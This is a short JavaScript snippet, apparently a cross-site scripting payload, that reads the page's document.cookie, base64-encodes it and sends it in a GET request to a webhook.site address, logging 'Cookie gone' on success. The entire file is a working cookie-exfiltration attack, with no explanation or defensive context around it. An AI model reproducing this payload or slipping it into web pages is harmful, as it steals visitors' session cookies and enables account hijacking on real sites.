var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
    	console.log("Cookie gone")
    }
};
xhttp.open("GET", "https://webhook.site/#!/87da7389-f0dc-496e-a606-b1accbc5630c/?a=" + btoa(document.cookie), true);
xhttp.send();